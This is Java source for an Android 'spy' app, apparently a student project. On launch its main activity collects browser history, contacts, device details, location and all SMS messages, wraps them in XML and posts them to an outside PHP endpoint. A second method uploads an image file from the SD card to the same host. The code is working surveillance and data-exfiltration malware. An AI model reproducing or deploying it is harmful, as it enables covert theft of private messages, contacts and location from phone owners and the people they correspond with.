package com.example.spyapp;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

import localisationInformations.Localisation;

import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import phoneDeviceInformations.PhoneDevice;
import smsInformations.GetSMS;
import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.os.Looper;
import android.text.util.Linkify;
import android.util.Log;
import android.view.Menu;
import android.widget.TextView;
import android.widget.Toast;
import browserInformations.BrowserHistory;
import contactsinformations.ListContact;

public class SpyActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		
		final SpyActivity zis = this;
		final TextView urlText = (TextView)zis.findViewById(R.id.texturl);
		final TextView loading = (TextView)zis.findViewById(R.id.loading);
		
		Thread t = new Thread(new Runnable() {
			public void run() {
				final String VALUE = returnAllXML(zis);
				Looper.prepare();
				try {
					final String response = sendAllInfos(VALUE);
					runOnUiThread(new Runnable() {
					     public void run() {
					    	 Toast.makeText(zis, "Succeeded !", Toast.LENGTH_LONG).show();
					    	 urlText.setText(getURLUser(response));
					    	 loading.setText("");
					    	 //urlText.setAutoLinkMask(Linkify.WEB_URLS);
					    }
					});
					
		        } catch (final Exception e) {
		            runOnUiThread(new Runnable() {
					     public void run() {
					    	 Toast.makeText(zis, "ERROR !", Toast.LENGTH_LONG).show();
					    	 urlText.setText("Error : "+e.toString());
					    	 loading.setText("");
					    }
					});
		        }
			}
		});
		t.start();
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}
	
	public String sendAllInfos(String VALUE) throws Exception {
		// Create a new HttpClient and Post Header
	    HttpClient httpclient = new DefaultHttpClient();
	    HttpPost httppost = new HttpPost("http://uqac.netii.net/senduserinfos.php");
	    try {
	        // Add your data
	        List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
	        //nameValuePairs.add(new BasicNameValuePair("nom", "Sylvain"));
	        //nameValuePairs.add(new BasicNameValuePair("gmail", "<contact></contact>"));
	        nameValuePairs.add(new BasicNameValuePair("xml", VALUE));
	        
	        httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs,"UTF-8"));
	        //httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));

	        // Execute HTTP Post Request
	        HttpResponse response = httpclient.execute(httppost);
	        
	        InputStream ips  = response.getEntity().getContent();
	        BufferedReader buf = new BufferedReader(new InputStreamReader(ips,"UTF-8"));
	        if(response.getStatusLine().getStatusCode()!=HttpStatus.SC_OK)
	        {
	            throw new Exception(response.getStatusLine().getReasonPhrase());
	        }
	        StringBuilder sb = new StringBuilder();
	        String s;
	        while(true )
	        {
	            s = buf.readLine();
	            if(s==null || s.length()==0)
	                break;
	            sb.append(s);

	        }
	        buf.close();
	        ips.close();
	        return sb.toString();

	    } catch (ClientProtocolException e) {
	        return null;
	    } catch (IOException e) {
	    	return null;
	    }
    }
	
	
	public String getURLUser(String httpResponse){
		Log.d("HTTP",httpResponse);
		int indexDebut = httpResponse.indexOf("#####");
		int indexFin = httpResponse.indexOf("#####", indexDebut+5);
		if (indexDebut>0 && indexFin>0 && indexFin>indexDebut)
			return httpResponse.substring(indexDebut+5, indexFin);
		return "0";
	}
	
	public String returnAllXML(Context context){

		String res="";
		
		BrowserHistory browserHistory=new BrowserHistory();
		String BrowserHistoryXML=browserHistory.BrowserHistoToXml(context);
		
		ListContact listContact=new ListContact();
		String listContactXML= listContact.GetAllContactsInformationsToXML(context);
		
		PhoneDevice phoneDevice= new PhoneDevice();
		String phoneDeviceXML= phoneDevice.deviceInformationsToXML(context);
		
		Localisation localisation= new Localisation();
		
		String localisationXML=localisation.localisationtoXML(context);
		
		GetSMS getSMS=new GetSMS();
		String getSMSXML= getSMS.getAllSmsToXML(context);
		
		res=    "<ALL>"+
				"<ALLHISTORY>"+BrowserHistoryXML+"</ALLHISTORY>"
				+"<ALLCONTACTS>"+listContactXML+"</ALLCONTACTS>"
				+phoneDeviceXML                 // <deviceInformations>
				+localisationXML				// <localisation>
				+"<ALLSMS>"+getSMSXML+"</ALLSMS>"
				+"</ALL>";
		
		return res;
	}
	
	
	
	
	
	public void upload() throws Exception {
        HttpURLConnection connection = null;
        DataOutputStream outputStream = null;

        String pathToOurFile = "/sdcard/img.jpg";
        String urlServer = "http://uqac.netii.net/sendimage.php";
        String lineEnd = "\r\n";
        String twoHyphens = "--";
        String boundary = "*****";

        int bytesRead, bytesAvailable, bufferSize;
        byte[] buffer;
        int maxBufferSize = 1 * 1024 * 1024;

            FileInputStream fileInputStream = new FileInputStream(new File(pathToOurFile));
            URL url = new URL(urlServer);

            connection = (HttpURLConnection) url.openConnection();
            connection.setDoInput(true);
            connection.setDoOutput(true);
            connection.setUseCaches(false);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Connection", "Keep-Alive");
            connection.setRequestProperty("Content-Type",
                    "multipart/form-data;boundary=" + boundary);

            outputStream = new DataOutputStream(connection.getOutputStream());
            outputStream.writeBytes(twoHyphens + boundary + lineEnd);
            outputStream
                    .writeBytes("Content-Disposition: form-data; name=\"uploadedfile\";filename=\""
                            + pathToOurFile + "\"" + lineEnd);
            outputStream.writeBytes(lineEnd);

            bytesAvailable = fileInputStream.available();
            bufferSize = Math.min(bytesAvailable, maxBufferSize);
            buffer = new byte[bufferSize];

            bytesRead = fileInputStream.read(buffer, 0, bufferSize);

            while (bytesRead > 0) {
                outputStream.write(buffer, 0, bufferSize);
                bytesAvailable = fileInputStream.available();
                bufferSize = Math.min(bytesAvailable, maxBufferSize);
                bytesRead = fileInputStream.read(buffer, 0, bufferSize);
            }

            outputStream.writeBytes(lineEnd);
            outputStream.writeBytes(twoHyphens + boundary + twoHyphens
                    + lineEnd);

            String serverResponseMessage = connection.getResponseMessage();

            Toast.makeText(this, serverResponseMessage, Toast.LENGTH_LONG).show();

            fileInputStream.close();
            outputStream.flush();
            outputStream.close();
    }
}
